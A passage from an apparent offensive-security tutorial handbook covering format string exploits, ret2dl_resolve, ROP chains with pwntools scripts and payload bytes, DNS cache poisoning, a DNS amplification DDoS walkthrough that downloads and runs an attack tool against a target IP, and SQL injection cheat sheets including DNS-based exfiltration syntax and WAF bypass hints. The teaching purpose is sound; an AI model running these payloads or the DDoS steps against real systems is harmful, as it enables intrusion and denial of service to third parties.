<p>With this information, we can exploit the buffer overflow:</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/SBO_pwn.png" alt="" /></p>
<h2 id="shellcode-attacks"><a class="header" href="#shellcode-attacks">Shellcode Attacks</a></h2>
<p>When a binary is compiled with NX disabled, it means that instructions can be executed directly off the stack. This means that an adversary may write to the stack the assembly instructions they want to be executed in the form of bytes and then take advantage of some code redirection technique (such as the buffer overflow described above) in order to point the instruction pointer to the beginning of their malicious code. The bytes that they inject onto the stack are referred to as <em>shellcode</em>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-7"><a class="header" href="#introduction-7">Introduction</a></h1>
<p>The C language provides certain functionality for converting variables into human-readable strings. This can be seen in functions like <code>printf</code>. For example, the following code will combine the string <code>&quot;Printing the magic number... The magic number is &quot;</code> with the number stored in <code>a</code>.</p>
<pre><code class="language-cpp">int a = 2;
printf(&quot;Printing the magic number... The magic number is %d\n.&quot;, &amp;a);
</code></pre>
<p>The first argument is called the format string and <code>%d</code> is known as a format parameter. When using a variable as a format argument, you need to pass its address. There also exist multiple format parameters:</p>
<table><thead><tr><th style="text-align: center">Parameter</th><th style="text-align: left">Meaning</th><th style="text-align: center">Passed as</th></tr></thead><tbody>
<tr><td style="text-align: center">%p</td><td style="text-align: left">Prints the argument as a pointer</td><td style="text-align: center">Value</td></tr>
<tr><td style="text-align: center">%%</td><td style="text-align: left">Prints a % character</td><td style="text-align: center">Value</td></tr>
<tr><td style="text-align: center">%d</td><td style="text-align: left">Prints a signed decimal number</td><td style="text-align: center">Value</td></tr>
<tr><td style="text-align: center">%u</td><td style="text-align: left">Prints an unsigned decimal number</td><td style="text-align: center">Value</td></tr>
<tr><td style="text-align: center">%x</td><td style="text-align: left">Prints the argument as a hexadecimal number</td><td style="text-align: center">Value</td></tr>
<tr><td style="text-align: center">%s</td><td style="text-align: left">Prints a string</td><td style="text-align: center">Pointer</td></tr>
<tr><td style="text-align: center">%n</td><td style="text-align: left">Prints nothing, but stores the number of bytes written so far in the location specified by the pointer passed as an argument</td><td style="text-align: center">Pointer</td></tr>
</tbody></table>
<p>When <code>printf</code> is invoked, it goes backwards from the beginning of its stack frame through the stack in order to retrieve its arguments one by one. If a format string is specified but no actual arguments are pushed to the stack before the function is invoked, for every format parameter <code>printf</code> will go backwards through the stack. This will lead to the erroneous interpretation of stack memory and can lead to memory leaks. Furthermore, the <code>%n</code> format parameter can be utilised for writing arbitrary memory by manipulating the pointer into which it should store the number of bytes written so far. Consequently, format string vulnerabilities can beget arbitrary code execution by overwriting the GOT.</p>
<h1 id="the-essence-of-a-format-string-vulnerability"><a class="header" href="#the-essence-of-a-format-string-vulnerability">The Essence of a Format String Vulnerability</a></h1>
<p>Format string vulnerabilities occur when the format string of a function such as <code>printf</code> is passed directly as a buffer which can be manipulated by an attacker. The buffer itself may contain format characters which can be abused in arbitrary ways.</p>
<pre><code class="language-cpp">char input[100];
scanf(&quot;%100s&quot;, input);

printf(input);
</code></pre>
<p>This code is abominable, since the <code>input</code> buffer is entirely controlled by the user. If any format parameters are included in the buffer, <code>printf</code> will treat them accordingly and this can result in all sorts of mishaps. The correct way to implement such code is to actually pass the user input as a format argument to a format string in <code>printf</code>:</p>
<pre><code class="language-cpp">char input[100];
scanf(&quot;%100s&quot;, input);

printf(&quot;%100s&quot;, input);
</code></pre>
<h1 id="examples"><a class="header" href="#examples">Examples</a></h1>
<h2 id="leaking-memory"><a class="header" href="#leaking-memory">Leaking Memory</a></h2>
<p>Format string vulnerabilities can be easily exploited to leak memory on the stack. This is typically done through the use of the <code>%p</code> or <code>%x</code> format parameters. Filling a format string with those parameters will continously leak stack memory. Sometimes, however, the buffer we are writing to doesn't have enough space to store enough parameters for us to reach the value we want to leak. Luckily, C has some syntax sugar which allows us to retrieve a particular argument. This is done by using <code>%n\\( parameter</code>, where <code>n</code> is the number of the argument we want to access and <code>parameter</code> is the format parameter we want to use. Consequently, if we want to print the third value on the stack as a pointer, we would use <code>%n \\)p</code>.</p>
<p>Here is a simple example of such an attack.</p>
<p>leaking_memory.c:</p>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(void)
{

int input = 0;
int key = 0xdeadbeef;
char message[100];

printf(&quot;Enter a message to be sent:\n&quot;);

fgets(message, sizeof(message), stdin);

printf(&quot;The following message will be sent: \n&quot;);
printf(message);

printf(&quot;Enter the secret key in order to send the message. \n&quot;);
scanf(&quot;%d&quot;, &amp;input);

if (input == key)
{
	printf(&quot;Message successfully sent!\n&quot;);
}
else
{
	printf(&quot;Failed to send message!\n&quot;);
}


return 0;
}
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_leak.png" alt="" /></p>
<h2 id="writing-arbitrary-memory"><a class="header" href="#writing-arbitrary-memory">Writing Arbitrary memory</a></h2>
<p>The <code>%n</code> format parameter can be used to write to arbitrary memory. Recall that it takes a pointer a pointer as its argument, but where does it get this pointer from? Well, just as any other argument, this pointer is retrieved from the stack. But wait a minute... In i386 and amd64 function arguments are pushed to the stack before a procedure is invoked. Consequently, we can write any value to the stack by including it in the format string, navigating to this value with <code>%x</code> or <code>%p</code> and then just put a <code>%n</code> to treat this value as a location and write to it. As a shortcut, we can use the <code>%parameter\\( n</code>  to choose a particular value on the stack to treat as a pointer. </p>
<p>However, writing a large value would require a lot of characters before <code>%n</code>. Luckily, we can print those with a shortcut. Before <code>%n</code> we need to insert <code>%&lt;value&gt;x</code> and this will write <code>value</code> characters to the screen.</p>
<p>writing_memory.c:</p>
<pre><code class="language-cpp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int target = 0xdeadbeef;

int main(int argc, char *argv[])
{
	char buffer[64];

    fgets(buffer, 64, stdin);
    printf(buffer);

    if(target == 0xdeadc0de) 
    {
      	printf(&quot;Pwned!\n&quot;);
    	return EXIT_SUCCESS;
	} 
	else 
	{
  	  	printf(&quot;Try again.\n&quot;);
  	  	exit(EXIT_FAILURE);
  	}
}
</code></pre>
<p>Upon looking at this code, we immediately notice the potential for a format string vulnerability. We need to somehow overwrite the <code>target</code> variable and change its value to <code>0xdeadc0de</code>. This can be done through <code>%n</code>, but requires the address of <code>target</code>. You might need to use some type of leak to do this, but as an example I will use gdb, which on my machine tells me that <code>target</code> is located at <code>0x555555558048</code>. </p>
<p>Since this address will be included in the format string, the location of the beginning of the format string on the stack must be found. This can be done through some light fuzzing by putting, for example, a string of <code>A</code>s in the beginning and then following it up with <code>%x</code>s until the repeating <code>A</code>s are reached. The final cound to <code>%x</code> that have been used is the number of the argument. </p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_writing_arg_fuzz.png" alt="" /></p>
<p>Consequently, the beginning would be the 8th argument. Consequently, it is possible to calculate the argument number for the address included in the string.</p>
<p>We now have the address we want to write to, all that is needed is to set up the value we want to write. This means that we have to find a way to print a number of <code>0xdeadc0de</code> bytes before <code>%n</code>. One would be crazy for thinking that <em>actually</em> inserting so many bytes into the buffer is even possible. The trick here is to use specify the number of characters we want to pad <code>%n</code> with by using <code>%x</code> like so - <code>%&lt;padding&gt;x%&lt;argument&gt; \\)n</code>. Even still, the value is too large to be printed in a reasonable time. Here we are allowed to buck the system by splitting the value at the middle like so <code>dead</code> and <code>c0de</code> and just writing two short integers rather than one huge integer. Ergo, <code>0xdead</code> should be written at <code>0x555555558048 + 2 = 0x55555555804a</code>, whereas <code>0xc0de</code> should be placed at <code>0x555555558048</code>.</p>
<p>The amount of padding is given by the following formula:
<code>&lt;The value needed&gt; - &lt;Bytes already written&gt;</code></p>
<p>It is now possible to proceed. Let's commence with the least significant bytes - <code>0xc0de</code> (49374 in decimal). It is best if the address where we want to write to is put at the <em>end</em> of the string, since the internal stack pointer of <code>printf</code> only works with 8-byte displacements and, consequently, any address must have its leading <code>0</code>s until it takes up the entire 8 bytes. Additionally, a certain number of non-zero bytes may need to be inserted before the address in the format string for further alignment purposes.</p>
<p>To simplify matters here, both <code>0xdeadc0de</code> and <code>0xdeadbeef</code> begin with the same bytes, so we need only overwrite the last ones. If that were not the case, one would simply have to chain multiple paddings with multiple <code>%n</code> format parameters. Therefore, our format string should be the following:</p>
<p><code>&quot;%49374x%&lt;argument&gt;\\( n&lt;padding bytes&gt;&lt;zero-extended address&gt;&quot;</code></p>
<p>The <code>argument</code> number may from system to system and you have to either bruteforce it or calculate it using a debugger like gdb. I have calculated it be 10. You may need further padding bytes and the number of bytes has to either again be bruteforced or calculated. Any addresses to write to should be placed at the end of the string to avoid premature null-termination. Our final string looks like this:</p>
<p><code>&quot;%49374x%10 \\)hnAAA\x48\x80\x55\x55\x55\x55\x00\x00&quot;</code></p>
<p>The <code>h</code> before the <code>n</code> just tells <code>printf</code> to write a <code>short</code> instead of an <code>int</code> (Remember that we are only overwriting the last two bytes).</p>
<p><em>Note: You might be tempted to just print this string with python and pipe it into the program, but that's an appalling approach since the address may contain weird bytes that are outside the range of ASCII and this will result in errors. This can be bypassed by writing the exact bytes to a blank binary file and just piping the file instead of the python output. You might have to do this manually through a hex editor</em>.</p>
<p>I have now created a file called <code>input</code> which contains the following bytes:</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_input_file.png" alt="" /></p>
<p>Piping this file into the programme results in the overwriting of the <code>target</code> variable!</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_write_pipe.png" alt="" /></p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_write_pwn.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-8"><a class="header" href="#introduction-8">Introduction</a></h1>
<p>This is a highly sophisticated attack which leverages the way dynamic library functions are resolved at runtime in order to resolve an arbitrary procedure and invoke it, bypassing ASLR and requiring no leaks.</p>
<p>To understand the following content, you must know a lot about <a href="Exploitation/Binary%20Exploitation/Stack%20Exploitation/../../../Reverse%20Engineering/Binary%20Formats/ELF/Dynamic%20Linking.html">dynamic linking</a> with ELF files.</p>
<h1 id="theory"><a class="header" href="#theory">Theory</a></h1>
<p>It is possible to use <code>_dl_resolve</code> to call any external function by creating a fake relocation table, symbol table, string table, and GOT. <code>_dl_resolve</code> performs no upper boundary checks on the relocation argument, which means that we can make it arbitrarily large and thus point it to our fake relocation table. From there, we can do the same with the rest of the offsets. It does, however, check a few other things which we will need to work around.</p>
<p>Because of the checks that <code>_dl_resolve</code> performs, the <code>r_info</code> must be divisible by 0x18. The distance between the real symbol table and our fake one must be divisible by 0x18 and fit in 32 bits after this division. This practically prevents us from using the stack on 64-bit systems to store our fake tables and we will need to utilise the <code>.bss</code> section, which is closer to the real symbol table in the executable. Additionally, <code>r_info</code> must end in 0x7.</p>
<p>For the sake of simplicity, all of the fake tables will only contain one entry. Once we have the fake symbol table set up, we need to set <code>st_other</code> to 0 and <code>st_name</code> to the distance between the real string table and our fake one, which can in this case be a single null-terminated string. Next, <code>r_info</code> must be populated with <code>(( RealToFakeSymbolTableOffset / 0x18 ) &lt;&lt; 32 ) | 0x7</code>, where <code>RealToFakeSymbolTableOffset</code> is the 0x18 aligned distance between our fake and real symbol tables. Do not worry about all the bit-wise operations - these are taken care of by a few macros in <code>_dl_resolve</code>. <code>r_offset</code> on the other hand, must contain the distance between our fake global offset table and the ELF header.</p>
<p>The relocation argument should store the offset between the start of the real relocation table and the beginning of the fake relocation table divided by the size of one relocation entry and should be put at the top of the stack. Consequently, if gaining code execution through a stack buffer overflow, the relocation argument should follow the malicious return address.</p>
<h1 id="manual-exploitation"><a class="header" href="#manual-exploitation">Manual exploitation</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

char message[128];

void SendMessage()
{
	char sender[20];
	
	printf(&quot;Enter the message: \n&quot;);
	fgets(message, 128, stdin);
	
	printf(&quot;Enter the sender name: \n&quot;);
	fgets(sender, 0x40, stdin);
}

int main()
{
	SendMessage();		
	printf(&quot;Message sent!&quot;);
	return 0;
	
}
</code></pre>
<p>Manually performing this exploit is extremely cumbersome, so in addition to the manual exploitation, I will also show you a neat module that pwntools contains for this exact purpose. Anyway, the fake tables should be set in the following way:</p>
<p>Relocation argument:</p>
<ul>
<li>
<p><code>reloc_arg = (FakeRelocationTable - RealRelocationTable) / sizeof(Relocation Entry)</code></p>
</li>
<li>
<p>must be divisible by the size of the relocation entry:</p>
<ul>
<li><code>Elf32_Rel</code> : 8 bytes</li>
<li><code>Elf32_Rela</code>: 12 bytes</li>
<li><code>Elf64_Rel</code>: 16 bytes</li>
<li><code>Elf64_Rela</code>: 24 bytes</li>
</ul>
</li>
</ul>
<p>Fake relocation table:</p>
<ul>
<li><code>r_offset = FakeGOT - ElfHeader</code></li>
<li><code>[+0x8] r_info = (( (FakeSymbolTable - RealSymbolTable) / 0x18 ) &lt;&lt; 32 ) | 0x7</code>
<ul>
<li>the distance between the fake and the real symbol table must be divisible by 0x18, so padding might be required</li>
</ul>
</li>
<li><code>[+0x10] r_addend = 0 (doesn't matter)</code></li>
</ul>
<p>Fake symbol table:</p>
<ul>
<li><code>[+0x18] st_name = FakeStringTable - RealStringTable</code></li>
<li><code>[+0x20] st_info = 0 (doesn't matter)</code></li>
<li><code>[+0x21] st_other = 0</code></li>
</ul>
<p>Fake string table:</p>
<ul>
<li><code>[+0x22] function name = system\x00 (or any other function)</code></li>
</ul>
<p>The above offsets are from the beginning of the fake relocation table and are suited to x64. You will have to change them for x86 based on the size of the struct fields.</p>
<p>For any arguments you want to pass to the function, you will either need to use shellcode in your initial payload buffer or utilise ROP.</p>
<p>Consequently, the payload for the <code>message</code> is
<code>&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x99\x40\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x88\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\xda\x3b\x00\x00\x00\x00\x00\x00\x00\x00abort\x00&quot;</code></p>
<p>The actual buffer that will be overflowed is the <code>sender</code> buffer the payload for it looks like this:
<code>&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x30\x50\x55\x55\x55\x55\x00\x00\x6d\x02\x00\x00\x00\x00\x00\x00&quot;</code>
The last bytes are the value of the relocation argument and the ones before are the address of PLT0.</p>
<p>Indeed, running this exploit results in the programme's abortion through the <code>abort</code> function (you can check by the exit code).</p>
<pre><code class="language-python">from pwn import *

program = process(&quot;./dl_resolve&quot;)

print(program.recvlineS())
program.sendline(b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x99\x40\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x88\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\xda\x3b\x00\x00\x00\x00\x00\x00\x00\x00abort\x00&quot;)

print(program.recvlineS())
program.sendline(b&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x30\x50\x55\x55\x55\x55\x00\x00\x6d\x02\x00\x00\x00\x00\x00\x00&quot;)

program.interactive()
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/RDLR_manual.png" alt="" /></p>
<p>The <code>abort</code> procedure takes no arguments which made manual exploitation bearable, however, when you want to invoke a function with parameters, such as <code>system</code>, you will need to either execute additional shellcode before jumping to PLT0, or build a ROP chain. If you value your life, never exploit this manually.</p>
<h2 id="exploiting-with-pwntools"><a class="header" href="#exploiting-with-pwntools">Exploiting with pwntools</a></h2>
<p><code>pwntools</code> has an awesome module for performing this exploit.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-9"><a class="header" href="#introduction-9">Introduction</a></h1>
<p>Return-oriented programming is a set of techniques which allow code execution and bypass data execution prevention defences, such as NX, and code signing. ROP utilises <em>gadgets</em> in order to build chains and execute arbitrary instruction sequences.</p>
<p>Given control over the stack, an attacker may fill it with malicious return addresses, all pointing to the subsequent gadget in the ROP chain. When one gadget is executed, the <code>ret</code> instruction jumps to the address stored at the top of the stack and the stack pointer is incremented. Consequently, the stack pointer now points to the next malicious return address, forming a chain of gadgets.</p>
<h1 id="gadgets"><a class="header" href="#gadgets">Gadgets</a></h1>
<p>ROP gadgets are tiny instruction sequences which are already found in the target binary and end in a <code>ret</code> instruction. To manually find them within a binary, one might use a tool called <code>ROPgadget</code> with the following basic syntax:</p>
<p><code>ROPgadget --binary [binary name]</code></p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_ropgadget.png" alt="" /></p>
<p>(This is just a small portion of the output.)</p>
<h1 id="exploitation-1"><a class="header" href="#exploitation-1">Exploitation</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void func()
{
	system(&quot;echo 'An inconspicuous echo...'&quot;);
}

void vuln()
{
	char input[20];
	fgets(input, 0x60, stdin);
}

int main()
{
	char* HarmlessString = &quot;echo pwn&quot;;
	vuln();
	func();
	return 0;

}
</code></pre>
<p>We immediately notice a potential buffer overflow. Since <code>system</code> is called in the execution process of the binary, it will have a corresponding PLT entry. Furthermore, the string <code>&quot;/bin/sh&quot;</code> has been conveniently place in the binary - If we had the proper gadgets, we could string together a ROP chain, allowing us to execute <code>system(&quot;/bin/sh&quot;)</code>. Well, let's start digging.</p>
<p>Running ROPgadgets on the above binary reveals a way to write to <code>rdi</code>!
<code>0x000000000000126b : pop rdi ; ret</code></p>
<p>Consequently, we can just write the address of the <code>&quot;/bin/sh&quot;</code> string in the binary, place it on the stack and, when the time comes, <code>rdi</code> will be populated with this address. All we will then need to do is return to the PLT entry of <code>system</code>, so that the function is invoked with the correct argument!</p>
<p>The addresses we need turn out to be:</p>
<p><code>0x555555555040</code> - PLT entry of <code>system</code>
<code>0x55555555526b</code> - <code>pop rdi; ret</code> gadget
<code>0x555555556028</code> - <code>&quot;/bin/sh&quot;</code>
<code>0x5555555551ff</code> - the address we want to continue execution from once the ROP chain is finished</p>
<p>Knowing that we need exactly 40 character to overflow the return address of <code>vuln</code>, we get the following payload.</p>
<p><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x6b\x52\x55\x55\x55\x55\x00\x00\x28\x60\x55\x55\x55\x55\x00\x00\x40\x50\x55\x55\x55\x55\x00\x00\xff\x51\x55\x55\x55\x55\x00\x00</code></p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_manual.png" alt="" /></p>
<p>Input file:</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_manual_input.png" alt="" /></p>
<p>And... exploit!</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_manual_exp.png" alt="" /></p>
<h1 id="exploiting-with-pwntools-1"><a class="header" href="#exploiting-with-pwntools-1">Exploiting with pwntools</a></h1>
<p><code>pwntools</code> comes with tools for automating the process of finding gadgets and stringing them into chains for exploitation.</p>
<p>You will first need to load the ELF executable and specify its base address:</p>
<pre><code class="language-python">elf = ELF('./rop')
elf.address = 0x555555554000
</code></pre>
<p>Subsequently, initialise a ROP object:</p>
<pre><code class="language-python">rop = ROP(elf)
</code></pre>
<h2 id="pwntools-rop-commands"><a class="header" href="#pwntools-rop-commands">Pwntools ROP commands</a></h2>
<p>Get a dictionary of available gadgets:</p>
<pre><code class="language-python">rop.gadgets
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_pwn_gadgets.png" alt="" /></p>
<p>Insert raw bytes into the chain:</p>
<pre><code class="language-python">rop.raw(bytes)
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_pwn_raw.png" alt="" /></p>
<p>Call functions:</p>
<pre><code class="language-python">rop.call(symbol, [arguments])
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_pwn_call.png" alt="" /></p>
<p>Get chain as bytes:</p>
<pre><code class="language-python">rop.chain()
</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_pwn_chain_bytes.png" alt="" /></p>
<h2 id="the-exploit"><a class="header" href="#the-exploit">The Exploit</a></h2>
<p>Using the above cheatsheet, we arrive at the following python script for exploitation:</p>
<pre><code class="language-python">#!/usr/bin/python3

from pwn import *

context.clear(arch='amd64')
elf = ELF('./rop')
elf.address = 0x555555554000

rop = ROP(elf)
rop.call(elf.symbols['system'], [next(elf.search(b&quot;echo pwn\x00&quot;))])

prog = process('./rop')

payload = [b&quot;A&quot;*40, rop.chain()]
payload = b&quot;&quot;.join(payload)

prog.sendline(payload)
prog.interactive()

</code></pre>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_pwn_success.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dns"><a class="header" href="#dns">DNS</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-10"><a class="header" href="#introduction-10">Introduction</a></h1>
<p>A flaw of all DNS name servers is that if they contain incorrect information, they may spread it to clients or other name servers. Each DNS name server (even individual clients) has a DNS cache. The system stores there information about any responses it gets for domains it requested. An attacker could inject false entries in this cache and as such, any computer which queries the poisoned name server will receive false results. This is known as <em>DNS cache poisoning</em>. </p>
<p>The attack can be used to redirect users to a different website than the requested one. As such, it opens opportunities for phishing attacks by creating evil twins of login portals for well-known sites.</p>
<p>A tool for performing such targeted attacks is <a href="https://github.com/b4ckslash0/deserter">deserter</a>. Usage information is available on its GitHub page.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="what-is-dns-traffic-amplification"><a class="header" href="#what-is-dns-traffic-amplification">What is DNS Traffic Amplification?</a></h1>
<p>A DNS (Traffic) Amplificaton attack is a popular form of a distributed denial of service (DDoS) attack, which abuses open DNS resolvers to flood a target system with DNS response traffic. It's called an <em>amplification</em> attack because it uses DNS responses to upscale the size of the data sent to the victim.</p>
<h1 id="how-does-it-work"><a class="header" href="#how-does-it-work">How does it work?</a></h1>
<p>An attacker sends a DNS name lookup to an open resolver with the source IP spoofed to be the victim's IP address. That way, any response traffic would be sent to the victim and not the attacker. The requests submitted by the attacker usually aim to query for as much information as possible in order to maximise the amplification effect. In most cases, the queries sent are of type <code>ANY</code> which requests all known information about a particular DNS zone. Using a botnet, it's easy to create immense amounts of traffic. It is also rather difficult to protect against these attacks because the traffic is coming from legitimate sources - real DNS servers.</p>
<h1 id="conducting-a-dns-traffic-amplification-attack"><a class="header" href="#conducting-a-dns-traffic-amplification-attack">Conducting a DNS Traffic Amplification Attack</a></h1>
<h3 id="testing-a-dns-server-for-attack-surface"><a class="header" href="#testing-a-dns-server-for-attack-surface">Testing a DNS server for attack surface</a></h3>
<p>We should first check if a DNS Traffic Amplification is possible and if it's viable. We can do this through <a href="Exploitation/DNS/">Metasploit</a> using the module <code>auxiliary/scanner/dns/dns_amp</code>.</p>
<p><img src="Exploitation/DNS/Resources/Images/msf6-dns-amp.png" alt="" /></p>
<p>In the <code>RHOSTS</code> you need to put the IP of the name server you want to test. <em>This module will tell you if a name server can be used in an amplification attack but won't actually execute the attack.</em></p>
<p>Run the scanner:</p>
<p><img src="Exploitation/DNS/Resources/Images/msf6-dns-amp-sc-run.png" alt="" /></p>
<h3 id="executing-the-attack"><a class="header" href="#executing-the-attack">Executing the attack</a></h3>
<p>A simple tool is available only as a proof of concept <a href="https://github.com/rodarima/lsi/blob/master/entrega/p2/dnsdrdos.c">here</a>. You will need to download and then compile it:</p>
<pre><code class="language-bash">wget https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
</code></pre>
<pre><code class="language-bash">gcc -o dnsdrdos dnsdrdos.c -Wall -ansi
</code></pre>
<pre><code class="language-bash">┌──(backslash0@kali)-[~/MHN/DNS]-[]
└─\\(  wget https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
--2021-09-21 13:01:11--  https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15109 (15K) [text/plain]
Saving to: ‘dnsdrdos.c’

dnsdrdos.c                                                  100%[========================================================================================================================================&gt;]  14.75K  --.-KB/s    in 0.001s  

2021-09-21 13:01:11 (17.9 MB/s) - ‘dnsdrdos.c’ saved [15109/15109]

┌──(backslash0@kali)-[~/MHN/DNS]-[]
└─ \\) gcc -o dnsdrdos dnsdrdos.c -Wall -ansi
</code></pre>
<p>Now, create a file containing the IP's of each DNS server you want to use in the attack (only one IP per line). Use the following syntax to run the attack:</p>
<pre><code class="language-bash">sudo ./dnsdrdos -f &lt;dns servers file&gt; -s &lt;target IP&gt; -d &lt;domain&gt; -l &lt;number of loops through the list&gt;
</code></pre>
<pre><code class="language-bash">┌──(backslash0@kali)-[~/MHN/DNS]-[]
└─\\(  sudo ./dnsdrdos -f dns_servers -s 192.168.129.2 -d nsa.gov -l 30
-----------------------------------------------    
dnsdrdos - by noptrix - http://www.noptrix.net/    
-----------------------------------------------

┌──(backslash0@kali)-[~/MHN/DNS]-[]
└─ \\)
</code></pre>
<p>The output may be empty, but the packets were sent. You can verify this with wireshark:</p>
<p><img src="Exploitation/DNS/Resources/Images/dnsdrdos-wireshark.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web"><a class="header" href="#web">Web</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-metadata"><a class="header" href="#database-metadata">Database Metadata</a></h1>
<p>Database engines provide tables with the database's metadata. This metadata table is different for the different engines:</p>
<table><thead><tr><th>Engine</th><th>Table Name</th></tr></thead><tbody>
<tr><td>SQLite</td><td>sqlite_master</td></tr>
<tr><td>MySQL</td><td>information_schema</td></tr>
<tr><td>PostgreSQL</td><td>information_schema</td></tr>
<tr><td>Oracle</td><td>dba_tables</td></tr>
</tbody></table>
<h2 id="database-version"><a class="header" href="#database-version">Database Version</a></h2>
<table><thead><tr><th>Database</th><th>Version Info</th></tr></thead><tbody>
<tr><td>Oracle</td><td><code>SELECT banner FROM v\\( version</code> <br> <code>SELECT version FROM v \\)instance</code></td></tr>
<tr><td>Microsoft</td><td><code>SELECT @@version</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr>
<tr><td>MySQL</td><td><code>SELECT @@version </code></td></tr>
</tbody></table>
<h2 id="database-contents"><a class="header" href="#database-contents">Database Contents</a></h2>
<p>Listing tables and the columns they contain:</p>
<table><thead><tr><th>Database</th><th>Contents Info</th></tr></thead><tbody>
<tr><td>Oracle</td><td><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = 'Table Name'</code></td></tr>
<tr><td>Microsoft</td><td><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></td></tr>
<tr><td>MySQL</td><td><code> SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></td></tr>
</tbody></table>
<h1 id="string-concatenation"><a class="header" href="#string-concatenation">String Concatenation</a></h1>
<table><thead><tr><th>Database</th><th>Concatenation</th></tr></thead><tbody>
<tr><td>Oracle</td><td>'a'||'b'</td></tr>
<tr><td>Microsoft</td><td>'a'+'b'</td></tr>
<tr><td>PostgreSQL</td><td>'a'||'b'</td></tr>
<tr><td>MySQL</td><td>'a' 'b' (space) or <code>CONCAT('a','b')</code></td></tr>
</tbody></table>
<h1 id="unconditional-time-delays"><a class="header" href="#unconditional-time-delays">Unconditional Time Delays</a></h1>
<p>Replace <code>delay</code> with the desired delay in seconds.
Database | Delay Syntax
---------| ------------
Oracle| <code>dbms_pipe.receive_message(('a'),delay)</code>
Microsoft| <code>WAITFOR DELAY 'hours:minutes:seconds'</code>
PostgreSQL| <code>SELECT pg_sleep(delay)</code>
MySQL| <code>SELECT sleep(delay)</code></p>
<h1 id="dns-lookups"><a class="header" href="#dns-lookups">DNS Lookups</a></h1>
<table><thead><tr><th>Database</th><th>Lookup Syntax</th></tr></thead><tbody>
<tr><td>Oracle</td><td><code>SELECT UTL_INADDR.get_host_address('domain')</code> - requires elevated privileges</td></tr>
<tr><td>Microsoft</td><td><code>exec master..xp_dirtree '//domain/a'</code></td></tr>
<tr><td>PostgreSQL</td><td><code>copy (SELECT '') to program 'nslookup domain</code></td></tr>
<tr><td>MySQL</td><td>These work only on Windows <br> <code>LOAD_FILE('\\\\domain\\a')</code> <br> <code>SELECT ... INTO OUTFILE '\\\\domain\a'</code></td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network-layer-defences"><a class="header" href="#network-layer-defences">Network Layer Defences</a></h1>
<p>A web application firewall (WAF) can be configured to drop certain requests that look suspicious.</p>
<p>Common bypasses:</p>
<ul>
<li>inserting comments</li>
<li>changing character case</li>
